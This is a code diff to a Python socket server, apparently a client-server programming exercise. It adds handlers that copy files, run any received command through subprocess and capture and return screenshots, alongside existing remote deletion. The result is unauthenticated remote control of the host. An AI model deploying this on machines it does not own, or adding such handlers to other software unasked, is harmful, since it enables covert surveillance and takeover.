@@ -5,6 +5,8 @@ import os
 import glob
 import json
 import shutil
+import subprocess
+from PIL import ImageGrab
 from protocol import Protocol
 HOST = '0.0.0.0'
 
@@ -90,7 +92,6 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 elif command_type == Protocol.COMMAND_DELETE:
                     try:
                         data_to_send = b"Path does not exist!"
-
                         if os.path.exists(command[1].decode()):
                             if os.path.isdir(command[1].decode()):
                                 shutil.rmtree(command[1].decode())
@@ -100,9 +101,19 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                     except Exception as e:
                         print("Error occurred")
                         data_to_send = b"Error occurred"
-
-
-
+                elif command_type == Protocol.COMMAND_COPY:
+                    if os.path.exists(command[1].decode()) and os.path.exists(command[2].decode()):
+                        shutil.copy(command[1].decode(), command[2].decode())
+                        data_to_send = f"Succesfully copied {command[1].decode(), command[2].decode()}".encode()
+                elif command_type == Protocol.COMMAND_EXECUTE:
+                    subprocess.call(command[1].decode())
+                    data_to_send = b"Executed successfully"
+                elif command_type == Protocol.COMMAND_TAKE_SCREENSHOT:
+                    image = ImageGrab.grab()
+                    file_name = "ss.jpg"
+                    image.save(file_name)
+                    Protocol.send_file(conn, file_name)
+                    continue
 
                 conn.send(Protocol.create_msg(data_to_send))
             except Exception as e:
